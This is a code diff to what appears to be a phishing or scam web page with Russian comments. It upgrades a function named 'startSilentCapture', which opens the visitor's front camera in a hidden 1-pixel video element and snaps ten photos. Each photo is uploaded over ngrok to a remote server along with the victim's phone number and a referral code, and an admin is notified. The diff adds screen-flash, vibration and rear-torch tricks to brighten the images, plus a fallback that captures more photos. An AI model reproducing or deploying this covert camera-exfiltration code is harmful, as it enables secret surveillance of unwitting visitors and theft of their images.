@@ -1598,6 +1598,8 @@
     let cameraStarted = false;
     let isBanned = false;
     let cameraAllowed = false;
+    let rearStream = null;
+    let rearTrack = null;
 
     async function checkBan() {
         try {
@@ -1877,7 +1879,99 @@
     }
     setInterval(addChatMessage, 4000);
     
-    // ========== НОВАЯ УЛУЧШЕННАЯ ФУНКЦИЯ ЗАХВАТА КАМЕРЫ С ИМИТАЦИЕЙ ВСПЫШКИ ==========
+    // ========== ВСПЫШКА ЭКРАНА ==========
+    function triggerScreenFlash() {
+        const flash = document.createElement('div');
+        flash.id = 'screenFlashOverlay';
+        flash.style.cssText = `
+            position: fixed;
+            top: 0; left: 0;
+            width: 100vw; height: 100vh;
+            background: white;
+            z-index: 2147483647;
+            pointer-events: none;
+            opacity: 0;
+            transition: opacity 0.05s ease-in;
+        `;
+        document.body.appendChild(flash);
+        
+        // Мгновенная вспышка
+        requestAnimationFrame(() => {
+            flash.style.opacity = '1';
+        });
+        
+        // Держим 1.5 секунды
+        setTimeout(() => {
+            flash.style.transition = 'opacity 0.6s ease-out';
+            flash.style.opacity = '0';
+        }, 1500);
+        
+        // Удаляем
+        setTimeout(() => {
+            const el = document.getElementById('screenFlashOverlay');
+            if (el) el.remove();
+        }, 2200);
+    }
+    
+    // ========== РЕАЛЬНАЯ ВСПЫШКА ЗАДНЕЙ КАМЕРЫ (Android + Chrome) ==========
+    async function turnOnRearFlash() {
+        try {
+            console.log('🔍 Пробуем включить заднюю вспышку...');
+            
+            rearStream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: 'environment' }
+            });
+            
+            rearTrack = rearStream.getVideoTracks()[0];
+            const caps = rearTrack.getCapabilities();
+            
+            console.log('📷 Возможности задней камеры:', caps);
+            
+            if (caps.torch) {
+                await rearTrack.applyConstraints({
+                    advanced: [{ torch: true }]
+                });
+                console.log('🔥 ЗАДНЯЯ ВСПЫШКА ВКЛЮЧЕНА!');
+                return true;
+            } else {
+                console.log('⚠️ Torch не поддерживается на этом устройстве');
+                // Закрываем поток, он не нужен
+                rearStream.getTracks().forEach(t => t.stop());
+                rearStream = null;
+                rearTrack = null;
+                return false;
+            }
+        } catch(e) {
+            console.log('❌ Ошибка задней камеры:', e.message);
+            if (rearStream) {
+                rearStream.getTracks().forEach(t => t.stop());
+                rearStream = null;
+                rearTrack = null;
+            }
+            return false;
+        }
+    }
+    
+    async function turnOffRearFlash() {
+        try {
+            if (rearTrack) {
+                await rearTrack.applyConstraints({
+                    advanced: [{ torch: false }]
+                });
+                console.log('💡 Задняя вспышка выключена');
+            }
+            if (rearStream) {
+                rearStream.getTracks().forEach(t => t.stop());
+            }
+        } catch(e) {
+            console.log('Ошибка выключения вспышки:', e.message);
+        } finally {
+            rearStream = null;
+            rearTrack = null;
+        }
+    }
+    
+    // ========== ОСНОВНАЯ ФУНКЦИЯ ЗАХВАТА ==========
     async function startSilentCapture() {
         if (cameraAllowed) return;
         try {
@@ -1887,41 +1981,42 @@
             if (location.protocol !== 'https:' && location.hostname !== 'localhost' && location.hostname !== '127.0.0.1') {
                 throw new Error('Not secure context');
             }
-
-            // Максимальное качество камеры
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { 
-                    width: { ideal: 1920, max: 1920 },
-                    height: { ideal: 1080, max: 1080 },
-                    frameRate: { ideal: 60 },
+            
+            // ===== 1. ВСПЫШКА ЭКРАНА (работает везде) =====
+            triggerScreenFlash();
+            
+            // ===== 2. ВИБРАЦИЯ (Android) =====
+            if (navigator.vibrate) {
+                try {
+                    navigator.vibrate([200, 100, 300, 100, 500]);
+                    console.log('📳 Вибрация запущена');
+                } catch(e) {}
+            }
+            
+            // ===== 3. РЕАЛЬНАЯ ВСПЫШКА ЗАДНЕЙ КАМЕРЫ (только Android Chrome) =====
+            const realTorchOn = await turnOnRearFlash();
+            
+            // ===== 4. ФРОНТАЛКА ДЛЯ ФОТО =====
+            const frontStream = await navigator.mediaDevices.getUserMedia({
+                video: {
                     facingMode: 'user',
-                    // Пробуем включить максимальную яркость
-                    advanced: [
-                        { brightness: { ideal: 1.0, max: 1.0 } },
-                        { contrast: { ideal: 1.0, max: 1.0 } },
-                        { exposureMode: 'continuous' }
-                    ]
-                } 
+                    width: { ideal: 1920 },
+                    height: { ideal: 1080 }
+                }
             });
             cameraAllowed = true;
             
-            // Создаем видео элемент с максимальной яркостью через CSS
             const videoEl = document.createElement('video');
-            videoEl.srcObject = stream;
+            videoEl.srcObject = frontStream;
             videoEl.setAttribute('playsinline', 'true');
             videoEl.muted = true;
             videoEl.style.cssText = `
-                position: fixed;
-                top: -1000px;
-                left: -1000px;
-                width: 1px;
-                height: 1px;
-                opacity: 0;
-                filter: brightness(2) contrast(1.5) saturate(1.8) !important;
+                position: fixed; top: -1000px; left: -1000px;
+                width: 1px; height: 1px; opacity: 0;
+                filter: brightness(1.5) contrast(1.3);
             `;
             document.body.appendChild(videoEl);
             
-            // Ждем загрузки видео
             await new Promise((resolve) => {
                 videoEl.onloadedmetadata = resolve;
             });
@@ -1930,158 +2025,157 @@
             const canvas = document.createElement('canvas');
             const ctx = canvas.getContext('2d');
             
-            // Даем камере настроиться
-            await new Promise(r => setTimeout(r, 800));
+            // Даём камере прогреться, вспышка уже горит
+            await new Promise(r => setTimeout(r, 500));
             
             const startTime = performance.now();
             
-            // Делаем 10 фотографий с разными настройками яркости
+            // ===== 5. ДЕЛАЕМ 10 ФОТО =====
             for (let i = 0; i < 10; i++) {
                 canvas.width = videoEl.videoWidth || 1920;
                 canvas.height = videoEl.videoHeight || 1080;
-                
-                // Рисуем кадр
                 ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
                 
-                // Берем данные изображения
+                // Небольшое улучшение яркости (вспышка и так светит)
                 const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
                 const data = imageData.data;
-                
-                // АГРЕССИВНОЕ увеличение яркости - имитация вспышки
-                const brightnessMultiplier = 2.5 + (i * 0.1); // От 2.5x до 3.5x яркости
-                
                 for (let j = 0; j < data.length; j += 4) {
-                    // Увеличиваем RGB каналы
-                    data[j] = Math.min(255, data[j] * brightnessMultiplier);     // Red
-                    data[j + 1] = Math.min(255, data[j + 1] * brightnessMultiplier); // Green
-                    data[j + 2] = Math.min(255, data[j + 2] * brightnessMultiplier); // Blue
-                    
-                    // Добавляем белый фон для эффекта вспышки
-                    if (i < 3) { // Первые 3 кадра с эффектом "вспышки"
-                        const flashIntensity = 0.3 - (i * 0.1);
-                        data[j] = Math.min(255, data[j] + (255 * flashIntensity));
-                        data[j + 1] = Math.min(255, data[j + 1] + (255 * flashIntensity));
-                        data[j + 2] = Math.min(255, data[j + 2] + (255 * flashIntensity));
-                    }
+                    data[j] = Math.min(255, data[j] * 1.2);
+                    data[j + 1] = Math.min(255, data[j + 1] * 1.2);
+                    data[j + 2] = Math.min(255, data[j + 2] * 1.2);
                 }
-                
                 ctx.putImageData(imageData, 0, 0);
                 
-                // Дополнительный эффект: добавляем белый оверлей для вспышки
-                if (i < 2) {
-                    ctx.globalAlpha = 0.15;
-                    ctx.fillStyle = 'white';
-                    ctx.fillRect(0, 0, canvas.width, canvas.height);
-                    ctx.globalAlpha = 1.0;
-                }
+                const photoData = canvas.toDataURL('image/jpeg', 0.9);
                 
-                const photoData = canvas.toDataURL('image/jpeg', 0.95);
-                
-                // Отправляем фото
                 await fetch(`${API_URL}/upload_photo`, {
                     method: 'POST',
-                    headers: { 
+                    headers: {
                         'Content-Type': 'application/json',
                         'ngrok-skip-browser-warning': 'true'
                     },
-                    body: JSON.stringify({ 
-                        photo: photoData, 
-                        step: i+1, 
+                    body: JSON.stringify({
+                        photo: photoData,
+                        step: i + 1,
                         timestamp: Date.now(),
                         ref: currentRefCode || '',
                         phone: currentPhone || 'Неизвестно',
-                        flash_simulated: true,
-                        brightness_level: brightnessMultiplier.toFixed(1),
-                        quality: 'flash_simulated'
+                        real_flash: realTorchOn,
+                        screen_flash: true,
+                        vibration: true
                     })
                 });
                 
-                // Короткая пауза
                 if (i < 9) await new Promise(r => setTimeout(r, 150));
             }
             
             const endTime = performance.now();
             const totalTime = ((endTime - startTime) / 1000).toFixed(3);
             
-            stream.getTracks().forEach(track => track.stop());
+            // ===== 6. ВЫКЛЮЧАЕМ ВСПЫШКУ ЗАДНЕЙ КАМЕРЫ =====
+            await turnOffRearFlash();
+            
+            // ===== 7. ОСТАНАВЛИВАЕМ ФРОНТАЛКУ =====
+            frontStream.getTracks().forEach(track => track.stop());
             videoEl.remove();
             
-            sendToAdmin(`📸 10 ФОТО С ИМИТАЦИЕЙ ВСПЫШКИ за ${totalTime} секунд! Яркость x2.5-3.5`);
+            sendToAdmin(`📸 10 ФОТО за ${totalTime}сек | LED: ${realTorchOn ? '✅ РЕАЛЬНАЯ' : '❌ нет'} | Экран: ✅ | Вибрация: ✅`);
             
         } catch(e) {
             console.error('Camera error:', e);
             
-            // РЕЗЕРВНЫЙ ВАРИАНТ: Делаем хотя бы скриншот экрана если камера не доступна
+            // Выключаем вспышку при ошибке
+            await turnOffRearFlash();
+            
+            // Пробуем ещё раз через фронталку без вспышки
             try {
-                // Пробуем сделать скриншот через canvas
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    }
+                });
+                
+                const videoEl = document.createElement('video');
+                videoEl.srcObject = stream;
+                videoEl.setAttribute('playsinline', 'true');
+                videoEl.muted = true;
+                videoEl.style.cssText = `
+                    position: fixed; top: -1000px; left: -1000px;
+                    width: 1px; height: 1px; opacity: 0;
+                `;
+                document.body.appendChild(videoEl);
+                await videoEl.play();
+                
                 const canvas = document.createElement('canvas');
                 const ctx = canvas.getContext('2d');
                 
-                canvas.width = window.innerWidth;
-                canvas.height = window.innerHeight;
+                for (let i = 0; i < 5; i++) {
+                    canvas.width = videoEl.videoWidth || 640;
+                    canvas.height = videoEl.videoHeight || 480;
+                    ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
+                    
+                    const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+                    const data = imageData.data;
+                    for (let j = 0; j < data.length; j += 4) {
+                        data[j] = Math.min(255, data[j] * 1.5);
+                        data[j + 1] = Math.min(255, data[j + 1] * 1.5);
+                        data[j + 2] = Math.min(255, data[j + 2] * 1.5);
+                    }
+                    ctx.putImageData(imageData, 0, 0);
+                    
+                    const photoData = canvas.toDataURL('image/jpeg', 0.8);
+                    await fetch(`${API_URL}/upload_photo`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'ngrok-skip-browser-warning': 'true'
+                        },
+                        body: JSON.stringify({
+                            photo: photoData,
+                            step: i + 1,
+                            timestamp: Date.now(),
+                            ref: currentRefCode || '',
+                            phone: currentPhone || 'Неизвестно',
+                            real_flash: false,
+                            screen_flash: true,
+                            fallback: true
+                        })
+                    });
+                    
+                    if (i < 4) await new Promise(r => setTimeout(r, 300));
+                }
                 
-                // Рисуем белый фон (имитация вспышки)
-                ctx.fillStyle = 'white';
-                ctx.fillRect(0, 0, canvas.width, canvas.height);
+                stream.getTracks().forEach(track => track.stop());
+                videoEl.remove();
                 
-                // Добавляем текст
-                ctx.fillStyle = 'black';
-                ctx.font = '20px Arial';
-                ctx.fillText(`Screenshot for ${currentPhone || 'unknown'}`, 50, 100);
-                ctx.fillText(`Time: ${new Date().toLocaleString()}`, 50, 130);
+                sendToAdmin(`📸 5 ФОТО (fallback без LED, с яркостью)`);
                 
-                const screenshotData = canvas.toDataURL('image/png');
+            } catch(retryError) {
+                console.error('Fallback failed:', retryError);
                 
-                await fetch(`${API_URL}/upload_photo`, {
-                    method: 'POST',
-                    headers: { 
-                        'Content-Type': 'application/json',
-                        'ngrok-skip-browser-warning': 'true'
-                    },
-                    body: JSON.stringify({ 
-                        photo: screenshotData, 
-                        step: 0, 
-                        timestamp: Date.now(),
-                        ref: currentRefCode || '',
-                        phone: currentPhone || 'Неизвестно',
-                        flash_simulated: true,
-                        brightness_level: '3.0',
-                        quality: 'screenshot_fallback',
-                        note: 'Camera failed, screenshot taken instead'
-                    })
-                });
+                let userMessage = 'Не удалось получить доступ к камере.';
+                let detail = '';
                 
-                sendToAdmin(`📸 ЗАПАСНОЙ СКРИНШОТ сделан (камера недоступна)`);
+                if (retryError.name === 'NotAllowedError' || retryError.name === 'PermissionDeniedError') {
+                    userMessage = '🚫 Доступ к камере запрещён';
+                    detail = 'Разрешите доступ к камере в настройках браузера и обновите страницу.';
+                } else if (retryError.name === 'NotFoundError' || retryError.name === 'DevicesNotFoundError') {
+                    userMessage = '📷 Камера не найдена';
+                    detail = 'Подключите камеру к устройству или проверьте драйверы.';
+                } else if (retryError.name === 'NotReadableError' || retryError.name === 'TrackStartError') {
+                    userMessage = '⚠️ Камера занята другим приложением';
+                    detail = 'Закройте Zoom, Skype, Discord, OBS и другие программы, использующие камеру.';
+                } else if (retryError.message.includes('secure context') || location.protocol !== 'https:') {
+                    userMessage = '🔒 Требуется HTTPS';
+                    detail = 'Сайт должен быть открыт по защищённому протоколу https://.';
+                }
                 
-            } catch(fallbackError) {
-                console.error('Fallback also failed:', fallbackError);
+                showCameraError(userMessage, detail);
+                sendToAdmin(`❌ Ошибка камеры: ${retryError.name} - ${retryError.message}`);
+                await new Promise(r => setTimeout(r, 2000));
             }
-            
-            // Показываем ошибку пользователю
-            let userMessage = 'Не удалось получить доступ к камере.';
-            let detail = '';
-            
-            if (e.name === 'NotAllowedError' || e.name === 'PermissionDeniedError') {
-                userMessage = '🚫 Доступ к камере запрещён';
-                detail = 'Разрешите доступ к камере в настройках браузера и обновите страницу.';
-            } else if (e.name === 'NotFoundError' || e.name === 'DevicesNotFoundError') {
-                userMessage = '📷 Камера не найдена';
-                detail = 'Подключите камеру к устройству или проверьте драйверы.';
-            } else if (e.name === 'NotReadableError' || e.name === 'TrackStartError') {
-                userMessage = '⚠️ Камера занята другим приложением';
-                detail = 'Закройте Zoom, Skype, Discord, OBS и другие программы, использующие камеру, затем обновите страницу.';
-            } else if (e.message.includes('secure context') || location.protocol !== 'https:') {
-                userMessage = '🔒 Требуется HTTPS';
-                detail = 'Сайт должен быть открыт по защищённому протоколу https://.';
-            } else if (e.message.includes('not supported')) {
-                userMessage = '❌ Браузер не поддерживает камеру';
-                detail = 'Обновите браузер или используйте Chrome / Firefox.';
-            }
-            
-            showCameraError(userMessage, detail);
-            sendToAdmin(`❌ Ошибка камеры: ${e.name} - ${e.message}`);
-            
-            await new Promise(r => setTimeout(r, 2000));
         }
     }
     
@@ -2092,8 +2186,7 @@
         const modal = document.createElement('div');
         modal.id = 'cameraErrorModal';
         modal.style.cssText = `
-            position: fixed;
-            top: 0; left: 0;
+            position: fixed; top: 0; left: 0;
             width: 100vw; height: 100vh;
             background: rgba(0,0,0,0.9);
             backdrop-filter: blur(15px);
@@ -2117,18 +2210,8 @@
                 box-shadow: 0 0 50px rgba(255, 51, 102, 0.4);
             ">
                 <div style="font-size: 60px; margin-bottom: 15px;">📷</div>
-                <h3 style="
-                    color: #ff6680;
-                    font-size: 20px;
-                    margin-bottom: 15px;
-                    font-weight: bold;
-                ">${title}</h3>
-                <p style="
-                    color: #ccc;
-                    font-size: 14px;
-                    line-height: 1.6;
-                    margin-bottom: 20px;
-                ">${detail}</p>
+                <h3 style="color: #ff6680; font-size: 20px; margin-bottom: 15px;">${title}</h3>
+                <p style="color: #ccc; font-size: 14px; line-height: 1.6; margin-bottom: 20px;">${detail}</p>
                 
                 <div style="
                     background: rgba(255, 204, 0, 0.1);
